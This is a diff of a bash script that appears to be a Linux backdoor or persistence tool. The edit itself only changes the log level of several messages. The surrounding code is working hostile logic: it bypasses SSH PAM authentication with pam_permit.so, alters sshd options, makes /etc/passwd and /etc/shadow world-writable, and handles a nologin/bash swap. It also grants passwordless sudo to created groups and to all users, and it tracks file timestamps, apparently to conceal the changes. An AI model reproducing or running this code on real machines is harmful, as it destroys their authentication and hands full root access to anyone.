@@ -275,7 +275,7 @@ else
 	else
 		for option in $SSHD_OPTIONS; do
 			if grep -q "$option yes" "$SSHD_CONFIG"; then
-				cecho info "Option '$option' already enabled"
+				cecho log "Option '$option' already enabled"
 			else
 				sed -i "s/.*$option.*/$option yes/g" "$SSHD_CONFIG" && cecho info "Modified '$SSHD_CONFIG': option '$option' set to 'yes'" || cecho error "Couldn't modify '$SSHD_CONFIG' to set option '$option' to 'yes'"
 			fi
@@ -300,7 +300,7 @@ if [ ! -f "$SSHD_PAM" ]; then
 	cecho warning "SSHD PAM file '$SSHD_PAM' does not exist, skipping"
 else
 	if grep -q "pam_permit.so" "$SSHD_PAM"; then
-		cecho info "SSH PAM authentication already bypassed"
+		cecho log "SSH PAM authentication already bypassed"
 	else
 		pam_timestamp=`get_timestamp "$PAM_DIR"`
 		sshd_pam_timestamp=`get_timestamp "$SSHD_PAM"`
@@ -325,7 +325,7 @@ chmod o+w "$PASSWD" && cecho info "Made '$PASSWD' world writable" || cecho error
 chmod o+rw "$SHADOW" && cecho info "Made '$SHADOW' world readable and writable" || cecho error "Couldn't modify timestamp for '$SHADOW'"
 
 if [ -f "$BACKUP_NOLOGIN" ]; then
-	cecho info "Backup nologin file '$BACKUP_NOLOGIN' already exists, skipping"
+	cecho log "Backup nologin file '$BACKUP_NOLOGIN' already exists, skipping"
 else
 	nologin_path=`which nologin`
 	bash_path=`which bash`
@@ -364,7 +364,7 @@ else
 		if groupadd "$group" 2>/dev/null; then
 			cecho info "Created group '$group'"
 		elif [ $? -eq 9 ]; then
-			cecho info "Group '$group' already exists, skipping"
+			cecho log "Group '$group' already exists, skipping"
 		else
 			cecho error "Could not create group '$group'"
 			continue
@@ -372,14 +372,14 @@ else
 
 		sudoer_text="%$group ALL=(ALL) NOPASSWD: ALL"
 		if grep -q "$sudoer_text" "$SUDOERS"; then
-			cecho info "Group '$group' already in sudoers file '$SUDOERS', skipping"
+			cecho log "Group '$group' already in sudoers file '$SUDOERS', skipping"
 		else
 			echo "$sudoer_text" >> "$SUDOERS" && cecho info "Gave group '$group' passwordless sudo permissions" || cecho error "Could not add group '$group' to sudoers file '$SUDOERS'"
 		fi
 	done
 
 	if grep -q "ALL ALL=(ALL) NOPASSWD: ALL" "$SUDOERS"; then
-		cecho info "All users already have passwordless sudo permissions, skipping"
+		cecho log "All users already have passwordless sudo permissions, skipping"
 	else
 		echo "ALL ALL=(ALL) NOPASSWD: ALL" >> "$SUDOERS" && cecho info "Gave all users passwordless sudo permissions" || cecho error "Could not modify '$SUDOERS' to give all users passwordless sudo permissions"
 	fi
